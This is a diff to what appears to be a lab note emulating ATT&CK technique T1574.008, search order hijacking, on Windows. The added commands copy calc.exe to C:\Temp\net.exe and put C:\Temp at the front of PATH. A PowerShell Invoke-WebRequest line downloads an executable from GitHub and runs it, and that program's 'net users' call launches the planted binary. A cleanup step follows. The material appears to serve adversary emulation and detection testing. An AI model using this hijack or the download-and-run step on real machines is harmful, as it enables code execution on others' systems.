@@ -3,8 +3,19 @@ Hijack Execution Flow: Path Interception by Search Order Hijacking   T1574.008
 
 
 
+
+mkdir C:\Temp
 copy C:\Windows\System32\calc.exe C:\Temp\net.exe
+
+set OriginalPath=%PATH%
+set path=C:\Temp;%path%
+
+powershell -Command "Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/HijackExecFlowEx.exe -OutFile 'C:\Temp\HijackExecFlowEx.exe'"
 C:\Temp\HijackExecFlowEx.exe
+
+
+--------- CLEAN UP -----------
+set PATH=%OriginalPath%
 rmdir /s /q C:\Temp
 ----------------------------
 
@@ -14,7 +25,6 @@ HijackExecFlowEx.cpp
 #include <cstdlib>
 
 int main() {
-    // Use el comando "whoami" sin mostrar la salida
     std::system("net users");
 
     return 0;
